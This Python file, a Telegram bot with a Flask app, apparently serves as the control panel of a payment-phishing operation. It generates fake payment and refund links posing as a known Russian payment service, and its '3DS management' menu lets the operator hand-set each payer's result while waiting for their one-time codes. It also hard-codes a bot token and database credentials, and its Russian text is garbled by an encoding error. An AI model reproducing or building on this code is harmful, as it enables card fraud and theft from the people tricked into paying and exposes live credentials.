# -*- coding: utf-8 -*-
import time
import telebot
from telebot import types
import mysql.connector
from datetime import datetime
import sys
import hashlib 
import random
from flask import Flask, request, redirect, render_template_string
from threading import Thread

# Telegram Bot token
TOKEN = '7072444510:AAHMkePSqd8vXgbrTOJBbXihDRQYGN6Y56M' #API —Ç–µ—Å—Ç–æ–≤—ã–π
adminList = [6570604823]; # –ê–¥–º–∏–Ω—ã

# Database connection
mydb = mysql.connector.connect(
    host="db-mysql-nyc3-04264-do-user-17427062-0.g.db.ondigitalocean.com",
    user="doadmin",
    password="AVNS_d0WxqKS1idwyMvXeRHI",
    database="defaultdb"
)

mydb.ping(True)
mycursor = mydb.cursor()

# –°–æ–∑–¥–∞–Ω–∏–µ —Ç–∞–±–ª–∏—Ü, –µ—Å–ª–∏ –∏—Ö –Ω–µ—Ç
try:    
    mycursor.execute("CREATE TABLE path (id INT AUTO_INCREMENT PRIMARY KEY, link VARCHAR(255), creator VARCHAR(255), method BOOLEAN, sum INT, x INT, ip VARCHAR(255), cheker BOOLEAN, success BOOLEAN, nomoney BOOLEAN, limited BOOLEAN, error BOOLEAN, threeds BOOLEAN, disablepay BOOLEAN, cardban BOOLEAN, notrucard BOOLEAN)")
    print("*–°–æ–∑–¥–∞—ë–º —Ç–∞–±–ª–∏—Ü—É –ø—É—Ç–µ–π")
except Exception as e:
    print("–¢–∞–±–ª–∏—Ü–∞ –ø—É—Ç–µ–π –∏–º–µ–µ—Ç—Å—è")

try:    
    mycursor.execute("CREATE TABLE settings (id INT AUTO_INCREMENT PRIMARY KEY, domain VARCHAR(255), ip VARCHAR(255), token VARCHAR(255))")
    sql = "INSERT INTO settings (domain, ip, token) VALUES (%s, %s, %s)"
    val = ("http://paymaster.ru", "Plati.ru", TOKEN)
    mycursor.execute(sql, val)
    mydb.commit()
    print("*–°–æ–∑–¥–∞—ë–º —Ç–∞–±–ª–∏—Ü—É –Ω–∞—Å—Ç—Ä–æ–µ–∫")
except Exception as e:
    print("–¢–∞–±–ª–∏—Ü–∞ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∏–º–µ–µ—Ç—Å—è")
mycursor.close()

# Flask app initialization
app = Flask(__name__)

def generate_payment_link(amount):
    mydb.ping(True)
    mycursor = mydb.cursor()
    sql = "SELECT domain FROM settings WHERE id = 1"
    mycursor.execute(sql)
    myresult = mycursor.fetchone()
    mycursor.close()

    result = hashlib.md5(str(random.randint(0, 800000)).encode()).hexdigest()
    linkgen = str(myresult[0]) + '/payments/' + result[0:8] + '-' + result[8:16] + '-' + result[16:24] + '-' + result[24:32]

    mycursor = mydb.cursor()
    sql = "INSERT INTO path (link, creator, method, sum, x, ip, cheker, success, nomoney, limited, error, threeds, disablepay, cardban, notrucard) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)"
    val = (linkgen, '6570604823', 0, amount, 2, myresult[0], 0, 0, 0, 0, 0, 0, 0, 0, 0)
    mycursor.execute(sql, val)
    mydb.commit()
    mycursor.close()

    return linkgen


@app.route('/')
def index():
    return render_template_string("<h1>Hello, Flask!</h1>")

@app.route('/generate_link', methods=['POST'])
def generate_link():
    amount = request.form['amount']
    try:
        payment_link = generate_payment_link(amount)
        return redirect(payment_link)  # –†–µ–¥–∏—Ä–µ–∫—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É
    except Exception as e:
        return f'<h2>Error: {str(e)}</h2>'

# Telegram bot initialization
bot = telebot.TeleBot(TOKEN)

def listener(messages):
    for m in messages:
        if m.content_type == 'text':
            # print the sent message to the console
            print(str(m.chat.first_name) + " [" + str(m.chat.id) + "]: " + m.text)
            print("stepFlag = " + str(stepFlag))

bot.set_update_listener(listener)  # register listener

def backButton(cid, txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
    hideBoard = types.ReplyKeyboardRemove()

def adminMainMenu(cid, txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row(types.KeyboardButton('‚ÑπÔ∏è–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ 3ds'))
    markup.row(types.KeyboardButton('‚ñ∂Ô∏è–û–ø–ª–∞—Ç–∞'), types.KeyboardButton('‚óÄÔ∏è–í–æ–∑–≤—Ä–∞—Ç'))
    markup.row(types.KeyboardButton('‚è´–°–ø–∏—Å–æ–∫'), types.KeyboardButton('üöÆ–£–¥–∞–ª–µ–Ω–∏–µ'))
    markup.row(types.KeyboardButton('üî£–ù–∞—Å—Ç—Ä–æ–π–∫–∏'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
    hideBoard = types.ReplyKeyboardRemove()

def adminSettingsMenu(cid, txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row(types.KeyboardButton('üàÅUrl –ø–ª–∞—Ç–µ–∂–∫–∏'))
    markup.row(types.KeyboardButton('üî§–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –æ–ø–ª–∞—Ç—ã'))
    markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
    hideBoard = types.ReplyKeyboardRemove()

def form3dsMenu(cid, txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row(types.KeyboardButton('–£—Å–ø–µ—à–Ω–æ'), types.KeyboardButton('–ù–µ—Ç –¥–µ–Ω–µ–≥'))
    markup.row(types.KeyboardButton('–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'), types.KeyboardButton('–õ–∏–º–∏—Ç'))
    markup.row(types.KeyboardButton('–û—à–∏–±–∫–∞ 3ds'), types.KeyboardButton('–ó–∞–ø—Ä–µ—â–µ–Ω–∞ –æ–Ω–ª–∞–π–Ω –æ–ø–ª–∞—Ç–∞'))
    markup.row(types.KeyboardButton('–ë–∞–Ω –∫–∞—Ä—Ç—ã'), types.KeyboardButton('–ö–∞—Ä—Ç–∞ –Ω–µ –†–§'))
    markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
    hideBoard = types.ReplyKeyboardRemove()

summa = ""
checker = 0
method = 0
stepFlag = 0  # –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é

@bot.message_handler(commands=['start'])
def command_start(m):
    cid = m.chat.id
    if cid in adminList:  
        adminMainMenu(cid, "–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")

@bot.message_handler(func=lambda message: message.text == '–ù–∞–∑–∞–¥')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if stepFlag == 10 or stepFlag == 0 or stepFlag == 31 or stepFlag == 20 or stepFlag == 30 or stepFlag == 25 or stepFlag == 11 or stepFlag == 12 or stepFlag == 15 or stepFlag == 16 or stepFlag == 17:
        adminMainMenu(cid, "–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")
        stepFlag = 0
    elif stepFlag == 21 or stepFlag == 22:
        stepFlag = 20
        adminSettingsMenu(cid, "–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–ª–∞—Ç–µ–∂–∫–∏ –∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ–ø–ª–∞—Ç—ã")

@bot.message_handler(func=lambda message: message.text == '‚ñ∂Ô∏è–û–ø–ª–∞—Ç–∞')
def command_rules(m):
    global stepFlag
    global method
    cid = m.chat.id
    if cid in adminList:
        backButton(cid, "–£–∫–∞–∂–∏ —Å—É–º–º—É –æ–ø–ª–∞—Ç—ã?‚è¨")
        stepFlag = 10
        method = 0

@bot.message_handler(func=lambda message: message.text == '‚óÄÔ∏è–í–æ–∑–≤—Ä–∞—Ç')
def command_rules(m):
    global stepFlag
    global method
    cid = m.chat.id
    if cid in adminList:
        backButton(cid, "–£–∫–∞–∂–∏ —Å—É–º–º—É –≤–æ–∑–≤—Ä–∞—Ç–∞?‚è¨")
        stepFlag = 15
        method = 1

@bot.message_handler(func=lambda message: message.text == 'üî£–ù–∞—Å—Ç—Ä–æ–π–∫–∏')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        adminSettingsMenu(cid, "–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–ª–∞—Ç–µ–∂–∫–∏ –∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ–ø–ª–∞—Ç—ã")
        stepFlag = 20

@bot.message_handler(func=lambda message: message.text == 'üàÅUrl –ø–ª–∞—Ç–µ–∂–∫–∏')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT domain FROM settings WHERE id = 1"
            mycursor.execute(sql)
            myresult = mycursor.fetchone()
            mycursor.close()
        except Exception as e:
            print(e)
        backButton(cid, "–¢–µ–∫—É—â–∏–π –∞–¥—Ä–µ—Å –ø–ª–∞—Ç–µ–∂–∫–∏: " + str(myresult[0]) + "\n–î–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞, –≤–±–µ–π—Ç–µ –µ–≥–æ –Ω–∏–∂–µ‚è¨\n‚ö†Ô∏è–ê–¥—Ä–µ—Å –≤–≤–æ–¥–∏—Ç—Å—è –±–µ–∑ HTTP:// –∏ —Å–ª–µ—à–µ–π –≤ –∫–æ–Ω—Ü–µ‚ö†Ô∏è")
        stepFlag = 21

@bot.message_handler(func=lambda message: message.text == 'üî§–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –æ–ø–ª–∞—Ç—ã')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT ip FROM settings WHERE id = 1"
            mycursor.execute(sql)
            myresult = mycursor.fetchone()
            mycursor.close()
        except Exception as e:
            print(e)
        backButton(cid, "–¢–µ–∫—É—â–∞—è –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è: " + str(myresult[0]) + "\n–î–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞–∑–≤–∞–Ω–∏—è, –≤–±–µ–π—Ç–µ –µ–≥–æ –Ω–∏–∂–µ‚è¨")
        stepFlag = 22

@bot.message_handler(func=lambda message: message.text == 'üìå–°–æ–∑–¥–∞—Ç—åüìå')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and (stepFlag == 12 or stepFlag == 17):
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT * FROM settings WHERE id = 1"
            mycursor.execute(sql)
            myresult = mycursor.fetchone()
            mycursor.close()

            result = hashlib.md5(str(random.randint(0, 800000)).encode()).hexdigest()
            linkgen = str(myresult[1]) + '/payments/' + result[0:8] + '-' + result[8:16] + '-' + result[16:24] + '-' + result[24:32]

            mycursor = mydb.cursor()
            sql = "INSERT INTO path (link, creator, method, sum, x, ip, cheker, success, nomoney, limited, error, threeds, disablepay, cardban, notrucard) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)"
            val = (linkgen, cid, method, summa, 2, myresult[2], checker, 0, 0, 0, 0, 0, 0, 0, 0)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()

            mycursor = mydb.cursor()
            sql = "SELECT id FROM path WHERE link = %s"
            val = (linkgen,)
            mycursor.execute(sql, val)
            myresult = mycursor.fetchone()
            mycursor.close()

            adminMainMenu(cid, "–í–∞—à–∞ —Å—Å—ã–ª–∫–∞:\n" + linkgen + '\nID –¥–ª—è 3ds —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è: ' + str(myresult[0]))
        except Exception as e:
            bot.send_message(cid, e, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == '‚è´–°–ø–∏—Å–æ–∫')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor(buffered=True)
            sql = "SELECT id, link, method, sum, cheker FROM path"
            mycursor.execute(sql)
            myresult = mycursor.fetchall()
            mycursor.close()

            i = 0
            for x in myresult:
                bot.send_message(cid, "ID - " + str(myresult[i][0]) + " | –°—É–º–º–∞: " + str(myresult[i][3]) + " | –ú–µ—Ç–æ–¥ (1-–≤–æ–∑–≤—Ä–∞—Ç) - " + str(myresult[i][2]) + "\n–°—Å—ã–ª–∫–∞: " + str(myresult[i][1]), parse_mode="Markdown")
                i = i + 1
            adminMainMenu(cid, "–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:")
        except Exception as e:
            bot.send_message(cid, e, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == 'üöÆ–£–¥–∞–ª–µ–Ω–∏–µ')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        backButton(cid, "–£–∫–∞–∂–∏—Ç–µ ID —Å—Å—ã–ª–∫–∏ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è. 0 - —É–¥–∞–ª–∏—Ç—å –≤—Å—ë")
        stepFlag = 25

@bot.message_handler(func=lambda message: message.text == '‚ÑπÔ∏è–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ 3ds')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        stepFlag = 30
        backButton(cid, "–í–≤–µ–¥–∏—Ç–µ ID —Å—Å—ã–ª–∫–∏ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:")

@bot.message_handler(func=lambda message: message.text == '–£—Å–ø–µ—à–Ω–æ')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET success = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞. –û–∂–∏–¥–∞–µ–º –Ω–æ–≤—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è")

@bot.message_handler(func=lambda message: message.text == '–ù–µ—Ç –¥–µ–Ω–µ–≥')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET nomoney = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–ù–∞ –∫–∞—Ä—Ç–µ –Ω–µ—Ç –¥–µ–Ω–µ–≥.")

@bot.message_handler(func=lambda message: message.text == '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET error = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø–ª–∞—Ç–µ.")

@bot.message_handler(func=lambda message: message.text == '–õ–∏–º–∏—Ç')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET limited = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–ù–∞ –∫–∞—Ä—Ç–µ –∑–∞–∫–æ–Ω—á–∏–ª—Å—è –ª–∏–º–∏—Ç –ø–æ –ø–µ—Ä–µ–≤–æ–¥–∞–º.")

@bot.message_handler(func=lambda message: message.text == '–û—à–∏–±–∫–∞ 3ds')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET threeds = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–û—à–∏–±–∫–∞ 3ds.")

@bot.message_handler(func=lambda message: message.text == '–ó–∞–ø—Ä–µ—â–µ–Ω–∞ –æ–Ω–ª–∞–π–Ω –æ–ø–ª–∞—Ç–∞')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET disablepay = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–ù–∞ –∫–∞—Ä—Ç–µ –≤—ã–∫–ª—é—á–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è –æ–Ω–ª–∞–π–Ω –æ–ø–ª–∞—Ç—ã.")

@bot.message_handler(func=lambda message: message.text == '–ë–∞–Ω –∫–∞—Ä—Ç—ã')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET cardban = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–ö–∞—Ä—Ç–∞ –∑–∞–±–∞–Ω–µ–Ω–∞.")

@bot.message_handler(func=lambda message: message.text == '–ö–∞—Ä—Ç–∞ –Ω–µ –†–§')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET notrucard = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid, "–ö–∞—Ä—Ç–∞ –Ω–µ —Ä–æ—Å—Å–∏–π—Å–∫–æ–≥–æ –±–∞–Ω–∫–∞.")

control = ()

@bot.message_handler(func=lambda message: True, content_types=['text'])
def command_default(m):
    global stepFlag
    global summa
    global checker
    global control

    cid = m.chat.id
    text = m.text
    if stepFlag == 10:
        summa = text
        backButton(cid, "–í–∫–ª—é—á–∏—Ç—å —á–µ–∫–µ—Ä –±–∞–ª–∞–Ω—Å–∞? (–î–∞/–ù–µ—Ç)")
        stepFlag = 11
    elif stepFlag == 11:
        if text.lower() == "–¥–∞":
            checker = 1
            stepFlag = 12
            txt = "–í—Å—ë –≥–æ—Ç–æ–≤–æ –∫ —Å–æ–∑–¥–∞–Ω–∏—é —Å—Å—ã–ª–∫–∏:\n–¢–∏–ø - –æ–ø–ª–∞—Ç–∞\n–°—É–º–º–∞ - " + summa + "\n –ß–µ–∫–µ—Ä - –í–∫–ª—é—á–µ–Ω"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
            markup.row(types.KeyboardButton('üìå–°–æ–∑–¥–∞—Ç—åüìå'))
            markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
            hideBoard = types.ReplyKeyboardRemove()
        elif text.lower() == "–Ω–µ—Ç":
            checker = 0
            stepFlag = 12
            txt = "–í—Å—ë –≥–æ—Ç–æ–≤–æ –∫ —Å–æ–∑–¥–∞–Ω–∏—é —Å—Å—ã–ª–∫–∏:\n–¢–∏–ø - –û–ø–ª–∞—Ç–∞\n–°—É–º–º–∞ - " + summa + "\n –ß–µ–∫–µ—Ä - –í—ã–∫–ª—é—á–µ–Ω"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
            markup.row(types.KeyboardButton('üìå–°–æ–∑–¥–∞—Ç—åüìå'))
            markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
            hideBoard = types.ReplyKeyboardRemove()
        else:
            bot.send_message(cid, "–ù—É–∂–Ω–æ –æ—Ç–≤–µ—Ç–∏—Ç—å –¥–∞ –∏–ª–∏ –Ω–µ—Ç", parse_mode="Markdown")
    elif stepFlag == 15:
        stepFlag = 16
        summa = text
        backButton(cid, "–í–∫–ª—é—á–∏—Ç—å —á–µ–∫–µ—Ä –±–∞–ª–∞–Ω—Å–∞? (–î–∞/–ù–µ—Ç)")
    elif stepFlag == 16:
        if text.lower() == "–¥–∞":
            checker = 1
            stepFlag = 17
            txt = "–í—Å—ë –≥–æ—Ç–æ–≤–æ –∫ —Å–æ–∑–¥–∞–Ω–∏—é —Å—Å—ã–ª–∫–∏:\n–¢–∏–ø - –í–æ–∑–≤—Ä–∞—Ç\n–°—É–º–º–∞ - " + summa + "\n –ß–µ–∫–µ—Ä - –í–∫–ª—é—á–µ–Ω"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
            markup.row(types.KeyboardButton('üìå–°–æ–∑–¥–∞—Ç—åüìå'))
            markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
            hideBoard = types.ReplyKeyboardRemove()
        elif text.lower() == "–Ω–µ—Ç":
            checker = 0
            stepFlag = 17
            txt = "–í—Å—ë –≥–æ—Ç–æ–≤–æ –∫ —Å–æ–∑–¥–∞–Ω–∏—é —Å—Å—ã–ª–∫–∏:\n–¢–∏–ø - –í–æ–∑–≤—Ä–∞—Ç\n–°—É–º–º–∞ - " + summa + "\n –ß–µ–∫–µ—Ä - –í—ã–∫–ª—é—á–µ–Ω"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
            markup.row(types.KeyboardButton('üìå–°–æ–∑–¥–∞—Ç—åüìå'))
            markup.row(types.KeyboardButton('–ù–∞–∑–∞–¥'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode="Markdown")
            hideBoard = types.ReplyKeyboardRemove()
        else:
            bot.send_message(cid, "–ù—É–∂–Ω–æ –æ—Ç–≤–µ—Ç–∏—Ç—å –¥–∞ –∏–ª–∏ –Ω–µ—Ç", parse_mode="Markdown")
    elif stepFlag == 21:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE settings SET domain = %s WHERE id = 1"
            val = (text,)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
            stepFlag = 20
            adminSettingsMenu(cid, "–ù–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–ª–∞—Ç–µ–∂–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω:\n" + text)
        except Exception as e:
            print(e)
    elif stepFlag == 22:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE settings SET ip = %s WHERE id = 1"
            val = (text,)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
            stepFlag = 20
            adminSettingsMenu(cid, "–ù–æ–≤–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏:\n" + text)
        except Exception as e:
            print(e)
    elif stepFlag == 25:
        if text == '0':
            try:
                mycursor = mydb.cursor()
                mycursor.execute("DELETE FROM path")
                adminMainMenu(cid, "–í—Å–µ —Å—Å—ã–ª–∫–∏ —É–¥–∞–ª–µ–Ω—ã!")
                stepFlag = 0
            except Exception as e:
                bot.send_message(m.chat.id, e)
        else:
            try:
                mycursor = mydb.cursor()
                sql = "DELETE FROM path WHERE id = %s"
                adr = (text,)
                mycursor.execute(sql, adr)
                mydb.commit()
                adminMainMenu(cid, "–°—Å—ã–ª–∫–∞ —É–¥–∞–ª–µ–Ω–∞!")
                stepFlag = 0
            except Exception as e:
                bot.send_message(m.chat.id, e)
    elif stepFlag == 30:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT * FROM path WHERE id = %s"
            val = (text,)
            mycursor.execute(sql, val)
            myresult = mycursor.fetchone()
            mycursor.close()
        except Exception as e:
            print(e)

        if myresult is None:
            backButton(cid, '–°—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ID —Å—Å—ã–ª–∫–∏:')
        else:
            control = myresult
            stepFlag = 31
            form3dsMenu(cid, "–§–æ—Ä–º–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è 3DS")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global control
    cid = call.message.chat.id
    if call.data == "success":
        form3dsMenu(cid, "–û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞.\n–û–∂–∏–¥–∞–µ–º –Ω–æ–≤—ã–π –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–π –∫–æ–¥!")
        bot.delete_message(call.message.chat.id, call.message.id)

        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET success = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(call.message.chat.id, e)
        
    elif call.data == "declineUsers":
        bot.delete_message(call.message.chat.id, call.message.id)
        form3ds(cid)

def run_bot():
    bot.polling()

def run_flask():
    app.run(debug=False, use_reloader=False)

if __name__ == '__main__':
    Thread(target=run_flask).start()
    run_bot()
